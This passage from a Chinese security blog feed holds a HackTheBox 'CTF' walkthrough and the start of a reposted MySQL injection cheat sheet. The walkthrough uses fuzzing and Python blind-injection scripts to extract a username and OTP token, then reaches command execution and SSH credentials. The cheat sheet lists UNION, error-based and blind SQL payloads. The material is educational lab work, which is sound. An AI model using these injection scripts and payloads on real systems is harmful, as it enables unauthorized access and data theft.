<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&amp;(objectClass&#x3D;*)(objectClass&#x3D;*))(&amp;(objectClass&#x3D;void)(type&#x3D;Epson*))</span><br></pre></td></tr></table></figure>
<p><strong>仅第一个LDAP过滤器会被处理</strong>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&amp;(objectClass&#x3D;*)(objectClass&#x3D;*))</span><br></pre></td></tr></table></figure>
<p>那么这样就和我们查询的初衷相违背了。</p>
<p>接下来就是这篇文章的重头戏了，我们主要从这个靶机中学到两点：</p>
<ul>
<li>怎么发现LDAP注入漏洞</li>
<li>如何利用LDAP注入漏洞</li>
</ul>
<h2 id="0x03-从HTB靶机中学习LDAP注入">0x03 从HTB靶机中学习LDAP注入</h2>
<h3 id="Initial-Enunciation">Initial Enunciation</h3>
<p>拿到靶机先用Nmap扫一下端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Nmap 7.80 scan initiated Fri Jul 10 10:50:40 2020 as: nmap -sC -sV -oN ctf 10.10.10.122</span><br><span class="line">Nmap scan report for ctf.htb (10.10.10.122)</span><br><span class="line">Host is up (1.8s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e (RSA)</span><br><span class="line">|   256 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb (ECDSA)</span><br><span class="line">|_  256 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL&#x2F;1.0.2k-fips mod_fcgid&#x2F;2.3.9 PHP&#x2F;5.4.16)</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.6 (CentOS) OpenSSL&#x2F;1.0.2k-fips mod_fcgid&#x2F;2.3.9 PHP&#x2F;5.4.16</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line"># Nmap done at Fri Jul 10 11:03:44 2020 -- 1 IP address (1 host up) scanned in 783.74 seconds</span><br></pre></td></tr></table></figure>
<p>查看80端口</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710145257.png" alt=""></p>
<p>大概的意思就是让我们尝试去登录这个系统，但是不能用SQLmap或者Dirbuster去暴力猜解用户名和密码。</p>
<p>再去登录界面看一下：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710153946.png" alt=""></p>
<p>提示我们是一个OTP，即One Time Password，一般而言是1分钟更新一次。</p>
<p>查看源码，发现有一个Hint</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710154051.png" alt=""></p>
<blockquote>
<p>如果比较熟悉LDAP的话，这里的两个名词schema和existing attribute已经提示了是关于LDAP注入。</p>
</blockquote>
<p>作者用一个已知的属性去存储了81位的token string，Google搜一下<code>token string (81 digits)</code>。</p>
<blockquote>
<p><a href="https://www.systutorials.com/docs/linux/man/1-stoken/">https://www.systutorials.com/docs/linux/man/1-stoken/</a></p>
</blockquote>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710154249.png" style="zoom: 67%;" />
<p>可以看到一个关键的地方，<code>Pure numeric (81-digit) &quot;ctf&quot; (compressed token format) strings</code>，和靶机的题目相契合，现在就有一点思路了，应该要去找到这个81位纯数字的token，然后用stoken工具去生成OTP。那么主要是找到token，唯一可以利用的就是这个登录框了。</p>
<p>先随便用某个用户名和密码登录<code>admin:1234</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710164835.png" alt=""></p>
<p>返回<code>User admin not found</code>，再用SQL注入的万能密码试一试</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710164644.png" alt=""></p>
<p>直接是没有任何显示，应该是对一些特殊字符有黑名单过滤。Fuzz一下过滤了一些什么字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;FUZZ&amp;inputOTP&#x3D;1234&#39; -w special-chars.txt 10.10.10.122&#x2F;login.php</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710165335.png" alt=""></p>
<blockquote>
<p>–hw 233 代表过滤掉形如<code>User xxx not found</code>的返回信息。</p>
</blockquote>
<p>我们发现<code>+</code>和<code>&amp;</code>返回的是232 Words，但是在页面测试一下</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710173607.png" alt=""></p>
<p>发现返回的还是<code>User + not found</code>或者<code>User &amp; not found</code>，这样的话应该是233 Words，而不是Wfuzz返回的232 Words。</p>
<p>我们尝试把这些特殊字符二次URL编码，看Web应用是否还能解析，用seclists中的doble_uri_hex.txt作为字典</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;FUZZ&amp;inputOTP&#x3D;1234&#39; -w doble-uri-hex.txt 10.10.10.122&#x2F;login.php</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710193655.png" alt=""></p>
<p>最后Fuzz出来的被过滤的字符就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%2500 ---&gt; %00</span><br><span class="line">%2528 ---&gt; (</span><br><span class="line">%2529 ---&gt; )</span><br><span class="line">%252a ---&gt; *</span><br><span class="line">%255c ---&gt; \</span><br></pre></td></tr></table></figure>
<p>这些被过滤的字符就是LDAP注入需要过滤的所有字符，再结合<code>login.php</code>页面源代码中的hint，可以确定是LDAP注入。</p>
<h3 id="Getting-User-Access">Getting User Access</h3>
<p>先来看LDAP注入的最基本形式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&amp;</span><br><span class="line">	(password&#x3D;1234)</span><br><span class="line">	(uid&#x3D;ca01h%00)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>具体到这个靶机的话，我们需要猜解括号的个数。运用类似盲注的思想，如果注入成功，那么就会返回<code>User ca01h not found</code>。</p>
<p>假设只有一个括号：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710202659.png" alt=""></p>
<p>假设有两个括号：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710202740.png" alt=""></p>
<p>假设有三个括号：</p>
<p><img src="C:%5CUsers%5C51196%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200710202913036.png" alt="image-20200710202913036"></p>
<p>当尝试到三个括号用于闭合时，成功返回了<code>User ca01h%29%29%29%00 not found</code>，那么这个登录框的LDAP查询的基本形式就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&amp;</span><br><span class="line">	(&amp;</span><br><span class="line">		(password&#x3D;1234)</span><br><span class="line">		(uid&#x3D;ca01h)))%00</span><br><span class="line">	)</span><br><span class="line">	(&amp;|</span><br><span class="line">		(other comparing)</span><br><span class="line">	)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>接着，我们再回头去看一下Fuzz出来的被过滤的字符，其中<code>%25%2a</code>返回的消息长度为231 Words</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710203938.png" alt=""></p>
<p>发现回显的消息是<code>Cannot login</code>，说明可以用<code>*</code>通配符来盲注用户名，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">### username_burp.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_lowercase</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;http://10.10.10.122/login.php&#x27;</span></span><br><span class="line"></span><br><span class="line">username, done = <span class="string">&#x27;&#x27;</span>, <span class="literal">False</span></span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> done:</span><br><span class="line">	<span class="keyword">for</span> c <span class="keyword">in</span> ascii_lowercase:</span><br><span class="line">		payload = username + c + quote_plus(<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">		data = &#123;</span><br><span class="line">			<span class="string">&#x27;inputUsername&#x27;</span>: payload,</span><br><span class="line">			<span class="string">&#x27;inputOTP&#x27;</span>: <span class="string">&#x27;1234&#x27;</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		resp = requests.post(URL, data=data)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;Cannot login&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">			username += c</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        sys.stdout.write(<span class="string">f&#x27;\r<span class="subst">&#123;username&#125;</span><span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">		time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        done = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">f&#x27;[+] Username: <span class="subst">&#123;username&#125;</span> \n&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710210916.png" alt=""></p>
<p>用户名为<code>ldapuser</code></p>
<p>知道了用户名之后，我们就要去获取生成OTP的81位token，通过页面源代码的提示，这个token存储在某一个LDAP默认已经存在的属性当中。而默认的属性可以在<a href="https://www.youtube.com/watch?v=51JQg202csw">PayloadsAllTheThings</a>中找到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c</span><br><span class="line">cn</span><br><span class="line">co</span><br><span class="line">commonName</span><br><span class="line">dc</span><br><span class="line">facsimileTelephoneNumber</span><br><span class="line">givenName</span><br><span class="line">gn</span><br><span class="line">homePhone</span><br><span class="line">id</span><br><span class="line">jpegPhoto</span><br><span class="line">l</span><br><span class="line">mail</span><br><span class="line">mobile</span><br><span class="line">name</span><br><span class="line">o</span><br><span class="line">objectClass</span><br><span class="line">ou</span><br><span class="line">owner</span><br><span class="line">pager</span><br><span class="line">password</span><br><span class="line">sn</span><br><span class="line">st</span><br><span class="line">surname</span><br><span class="line">uid</span><br><span class="line">username</span><br><span class="line">userPassword</span><br></pre></td></tr></table></figure>
<p>如果不想写脚本的话用wfuzz来Fuzz靶机的LDAP中存在的属性可能会更快一些，但还是要先找到注入的形式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&amp;</span><br><span class="line">	(&amp;</span><br><span class="line">		(password&#x3D;1234)</span><br><span class="line">		(uid&#x3D;ldapuser)</span><br><span class="line">		(FUZZ&#x3D;*)</span><br><span class="line">	)</span><br><span class="line">	(&amp;|</span><br><span class="line">		(other comparing)</span><br><span class="line">	)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>此外还要把注入的字符<code>ldapuser)(FUZZ=*</code>进行二次URL编码，编码之后的结果<code>ldapuser%2529%2528FUZZ%253d%252a</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;ldapuser%2529%2528FUZZ%253d%252a&amp;inputOTP&#x3D;1234&#39; -w LDAP_attributes.txt http:&#x2F;&#x2F;10.10.10.122&#x2F;login.php</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710213532.png" alt=""></p>
<p>我们Fuzz出来了这么些属性是存在于靶机的LDAP服务中的，现在的工作就是一个一个的属性来猜解，属于一些重复性的工作，就不在这里过多赘述了，最后可以找到token是存储于pager属性中。接着写脚本用来burp81位token</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># pager_burp.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits</span><br><span class="line"></span><br><span class="line">token = <span class="string">&quot;&quot;</span></span><br><span class="line">URL = <span class="string">&quot;http://10.10.10.122/login.php&quot;</span></span><br><span class="line">attribute = <span class="string">&quot;pager&quot;</span></span><br><span class="line">loop = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> loop &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">for</span> digit <span class="keyword">in</span> digits:</span><br><span class="line">        token = token</span><br><span class="line">        <span class="comment"># ldapuser)(pager=&lt;token&gt;)*</span></span><br><span class="line">        payload = <span class="string">f&quot;ldapuser%29%28<span class="subst">&#123;attribute&#125;</span>%3d<span class="subst">&#123;token&#125;</span><span class="subst">&#123;digit&#125;</span>%2a&quot;</span></span><br><span class="line">        data = &#123;<span class="string">&quot;inputUsername&quot;</span>: payload, <span class="string">&quot;inputOTP&quot;</span>: <span class="string">&quot;1234&quot;</span>&#125;</span><br><span class="line">        r = requests.post(URL, data=data)</span><br><span class="line">        sys.stdout.write(<span class="string">f&quot;\rToken: <span class="subst">&#123;token&#125;</span><span class="subst">&#123;digit&#125;</span>&quot;</span>)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;Cannot login&quot;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            token += digit</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> digit == <span class="string">&quot;9&quot;</span>:</span><br><span class="line">            loop = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">f&#x27;[+] Token: <span class="subst">&#123;token&#125;</span> \n&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710220938.png" alt=""></p>
<p>这里值得注意的是需要删掉最后的一个9，所以最后的token就是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">285449490011357156531651545652335570713167411445727140604172141456711102716717000</span><br></pre></td></tr></table></figure>
<p>接着用stoken工具导入token</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710221459.png" alt=""></p>
<p>生成OTP</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710230111.png" alt=""></p>
<p>成功登录后，跳转到<code>page.php</code>页面，可以执行命令</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710230246.png" alt=""></p>
<p>Damn it…提示我们<code>ldapuser</code>权限不够不能执行命令，这里有两种办法：</p>
<ul>
<li>
<p>对<code>group</code>属性进行注入，即把后面group属性的filter截断</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&amp;</span><br><span class="line">	(&amp;</span><br><span class="line">		(pager&#x3D;&lt;token&gt;)</span><br><span class="line">		(uid&#x3D;ldapuser)))%00</span><br><span class="line">	)</span><br><span class="line">	(|</span><br><span class="line">		(group&#x3D;root)</span><br><span class="line">		(group&#x3D;adm)</span><br><span class="line">	)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>使用<code>*</code>通配符作为用户名登录</p>
</li>
</ul>
<p>这里演示一下第一种方案，payload直接放到burp中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldapuser%2529%2529%2529%2500</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710233124.png" alt=""></p>
<p>再去执行ls命令</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710233303.png" alt=""></p>
<p>读取page.php文件：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710234438.png" alt=""></p>
<p>SSH登录：<code>fdapuser:e398e27d5c4ad45086fe431120932a01</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710234624.png" alt=""></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>Web安全学习</tag>
        <tag>LDAP</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入手册</title>
    <url>/Web_security/basic_learning/27.SQL%E6%B3%A8%E5%85%A5%E6%89%8B%E5%86%8C/</url>
    <content><![CDATA[<h1 id="SQL注入手册【转】">SQL注入手册【转】</h1>
<blockquote>
<p>来自https://northity.com/2019/03/02/Sql%E6%B3%A8%E5%85%A5%E6%89%8B%E5%86%8C</p>
</blockquote>
<h2 id="常见数据库搭配">常见数据库搭配</h2>
<ul>
<li>ASP + ACCESS + IIS</li>
<li><a href="http://ASP.NET">ASP.NET</a> + MSSQL +IIS</li>
<li>PHP + Mysql + Apache(Nginx)</li>
<li>JSP + Oracle(Mysql) + Tomcat</li>
</ul>
<p>目前来讲就遇到过这些常见组合，快速判断数据库类型是注入的第一步</p>
<h2 id="Mysql">Mysql</h2>
<h3 id="基础">基础</h3>
<h4 id="数据库名">数据库名</h4>
<ul>
<li>
<p>database()</p>
</li>
<li>
<p>schema()</p>
</li>
</ul>
<h4 id="当前登陆用户">当前登陆用户</h4>
<ul>
<li>
<p>USER()</p>
</li>
<li>
<p>CURRENT_USER()</p>
</li>
<li>
<p>SYSTEM_USER()</p>
</li>
<li>
<p>SESSION_USER()</p>
</li>
</ul>
<h4 id="数据库版本">数据库版本</h4>
<ul>
<li>
<p>VERSION()</p>
</li>
<li>
<p>@@VERSION</p>
</li>
<li>
<p>@@GLOBAL.VERSION</p>
</li>
</ul>
<h4 id="路径相关">路径相关</h4>
<ul>
<li>
<p>@@BASEDIR : mysql安装路径</p>
</li>
<li>
<p>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径</p>
</li>
<li>
<p>@@DATADIR : 数据存储路径</p>
</li>
<li>
<p>@@CHARACTER_SETS_DIR : 字符集设置文件路径</p>
</li>
<li>
<p>@@LOG_ERROR : 错误日志文件路径</p>
</li>
<li>
<p>@@PID_FILE : pid-file文件路径</p>
</li>
<li>
<p>@@BASEDIR : mysql安装路径</p>
</li>
<li>
<p>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径</p>
</li>
</ul>
<h4 id="字符串连接">字符串连接</h4>
<ul>
<li>concat(str1,str2) //将字符串首尾相连</li>
<li>concat_ws(separator,str1,str2) //将字符串用指定连接符连接</li>
<li>group_concat()//</li>
</ul>
<h4 id="字符截断">字符截断</h4>
<ul>
<li>left(str,index) //从左边第index开始截取</li>
<li>right(str,index) //从右边第index开始截取</li>
<li>substring(str,index) //从左边index开始截取</li>
<li>substr(str,index,len) //截取str,index开始,截取len的长度</li>
<li>mid(str,index,ken) //截取str 从index开始,截取len的长度</li>
</ul>
<h4 id="字符串比较函数">字符串比较函数</h4>
<ul>
<li>strcmp(expr1,expr2)//如果两个字符串是一样则返回0,如果第一个小于第二个则返回-1</li>
<li>find_in_set(str,strlist) //如果相同则返回1不同则返回0</li>
</ul>
<h4 id="注释">注释</h4>
<ul>
<li>
<p>–(后面还有个空格)</p>
</li>
<li>
<p># 单行注释符，url编码为%23</p>
</li>
<li>
<p>/*…*/</p>
</li>
<li>
<p>/! 语句 / 语句会被执行 可用做分割</p>
</li>
</ul>
<h4 id="运算符">运算符</h4>
<p>比较运算符</p>
<ul>
<li>
<p>=</p>
</li>
<li>
<p>&gt;</p>
</li>
<li>
<p>&lt;</p>
</li>
<li>
<p>!=</p>
</li>
<li>
<p>&lt;&gt; 不等于的意思</p>
</li>
<li>
<p>like (模糊匹配 <code>select '12345' like '12%' =&gt; true</code>)</p>
</li>
<li>
<p>in（<code>select '123' in ('12') =&gt; false</code>）</p>
</li>
<li>
<p>between (<code>select database() between 0x61 and 0x7a;//select database() between 'a' and 'z';</code>)</p>
</li>
<li>
<p>regexp / rlike(正则匹配<code>select '123455' regexp '^12' =&gt; true</code>)</p>
</li>
</ul>
<p>算术运算符</p>
<ul>
<li>
<ul>
<li></li>
</ul>
</li>
<li>-</li>
<li>
<ul>
<li></li>
</ul>
</li>
<li>/</li>
</ul>
<p>逻辑运算符</p>
<ul>
<li>not / ！</li>
<li>and / &amp;&amp;</li>
<li>or / ||</li>
<li>xor / ^</li>
</ul>
<p>位运算符</p>
<ul>
<li>&amp; 按位与</li>
<li>| 按位或</li>
<li>^ 按位异或</li>
<li>! 取反</li>
<li>&lt;&lt; 左移</li>
<li>&gt;&gt;右移</li>
</ul>
<h4 id="绕过函数">绕过函数</h4>
<ul>
<li>instr(str1,substr) //从子字符串中返回子串第一次出现的位置</li>
<li>lpad(str,len,padstr) rpad(str,len,padstr) // 在str的左(右)两边填充给定的padstr到指定的长度len,返回填充的结果</li>
</ul>
<h4 id="延时函数">延时函数</h4>
<ul>
<li>sleep()</li>
<li>benchmark(1000000,sha(1))</li>
</ul>
<h4 id="编码函数">编码函数</h4>
<ul>
<li>hex()</li>
<li>ascii()</li>
</ul>
<h4 id="文件函数">文件函数</h4>
<ul>
<li>load_file() //读文件路径可以用0x，char转换的字符</li>
<li>outfile <code>select * into outfile '/tmp/test.txt'</code></li>
<li>dumpfile //用法同上但是只能写入一行数据，常用于udf提权写dll</li>
</ul>
<h3 id="构造语句">构造语句</h3>
<h4 id="条件语句">条件语句</h4>
<ul>
<li><code>if(expr1,expr2,expr3)</code> // expr1 true执行expr2否则执行expr3</li>
<li><code>select case when (条件) then 代码1 else 代码 2 end</code></li>
</ul>
<h4 id="information-schema-结构">information_schema 结构</h4>
<ul>
<li>information_schema.tables:<br>
查询表名:table_name 对应的数据库名: table_schema</li>
<li>information_schema.columns:<br>
查询列名:column_name 对应的表名:table_schemam</li>
</ul>
<h4 id="Mysql注入语句一般形式">Mysql注入语句一般形式</h4>
<ul>
<li>联合 <code>构造联合语句 + 查询结果</code></li>
<li>盲注 <code>查询结果 + 比较运算符 + 猜测值</code></li>
<li>报错 <code>构造报错语句 + 查询结果</code></li>
</ul>
<h4 id="Mysql空白字符">Mysql空白字符</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 &#x2F;**&#x2F; tab</span><br><span class="line">%a0 这个不会被php的\s进行匹配</span><br><span class="line">&#x2F;*!*&#x2F; 内敛注释 #这个也可以用来做分隔</span><br></pre></td></tr></table></figure>
<p>函数名和括号直接可以插入特殊字符 ex</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">concat&#x2F;**&#x2F;()</span><br><span class="line"></span><br><span class="line">information_schema&#x2F;**&#x2F;.&#x2F;**&#x2F;TABLES</span><br><span class="line"></span><br><span class="line">information_schema%0a.%0aTABLES</span><br></pre></td></tr></table></figure>
<h3 id="判断注入是否存在">判断注入是否存在</h3>
<p>数值型注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1+1</span><br><span class="line">?id&#x3D;-1 or 1&#x3D;1</span><br><span class="line">?id&#x3D;-1 or 10-2&#x3D;8</span><br><span class="line">?id&#x3D;1 and 1&#x3D;2</span><br><span class="line">?id&#x3D;1 and 1&#x3D;1</span><br></pre></td></tr></table></figure>
<p>字符型注入<br>
参数被引号包围，所以需要闭合引号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;</span><br><span class="line">?id&#x3D;1&quot;</span><br><span class="line">?id&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;1</span><br><span class="line">?id&#x3D;1&quot; and &quot;1&quot;&#x3D;&quot;1</span><br></pre></td></tr></table></figure>
<p>闭合后构造语句再注释后面</p>
<h3 id="四大基本注入类型">四大基本注入类型</h3>
<h4 id="UNION注入">UNION注入</h4>
<p>最简单的注入</p>
<p>用UNION SELECT注入时，若后面要注出的数据的列与原数据列数不同，则会失败。所以需要先猜解列数。</p>
<p><strong>ORDER BY</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ORDER BY 10 #</span><br><span class="line">ORDER BY 5  #</span><br><span class="line">ORDER BY 2  #</span><br></pre></td></tr></table></figure>
<p>当ORDER BY的数字大于列数时会返回异常，反复测试，定位出正确的列数</p>
<p><strong>UNION SELECT</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UNION SELECT 1,2,3 #</span><br><span class="line">UNION ALL SELECT 1,2,3 #</span><br><span class="line">UNION ALL SELECT null,null,null #</span><br></pre></td></tr></table></figure>
<p><strong>数据库查询</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.SCHEMATA</span><br><span class="line">SELECT DATABASE()  </span><br><span class="line">SELECT schema()</span><br></pre></td></tr></table></figure>
<p><strong>表查询</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA&#x3D;DATABASE()</span><br><span class="line">SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA&#x3D;0xffffff</span><br></pre></td></tr></table></figure>
<p><strong>字段查询</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME&#x3D;0xffffff</span><br></pre></td></tr></table></figure>
<p><strong>数据获取</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(column_1,column_2) FROM databasename.tablename</span><br><span class="line">SELECT GROUP_CONCAT(column_1,column_2) FROM tablename  </span><br><span class="line">SELECT * FROM tablename</span><br></pre></td></tr></table></figure>
<h4 id="报错注入">报错注入</h4>
<p><strong>常见报错payload</strong></p>
<ul>
<li>
<p>floor()</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and (select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>updatexml() <a href="//5.1.5">//5.1.5</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1))</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>extractvalue() <a href="//5.1.5">//5.1.5</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and extractvalue(1,concat(0x5c,(select user())))</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>exp() <a href="//5.5.xn--5-bs6a4sito1pkfo13kbusp3f">//5.5.5版本之后可以使用</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select host from user where user &#x3D; &#39;root&#39; and Exp(~(select * from (select version())a));</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>name_const //支持老版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() 几何函数报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select multipoint((select * from (select * from (select * from (select version())a)b)c));</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="布尔盲注">布尔盲注</h4>
<p><strong>常用payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; OR (SELECT ASCII(SUBSTR(DATABASE(),i,1) ) &lt; j) #</span><br></pre></td></tr></table></figure>
<h4 id="时间盲注">时间盲注</h4>
<p><strong>常用payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,BENCHMARK(100000,SHA1(1)),0)</span><br><span class="line">UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,SLEEP(10),0)</span><br></pre></td></tr></table></figure>
<p>本质是if做判断然后是否执行sleep，再有回显的bool盲注中则不写延时语句，用0或者1代替</p>
<p>即查询结果有没有输出到页面是两者的本质区别，没有输出时才是时间盲注</p>
<p>除开最常见的sleep延时，还有以下姿势</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select benchmark(10000000,sha(1));</span><br></pre></td></tr></table></figure>
<p><strong>比赛姿势</strong></p>
<ul>
<li>
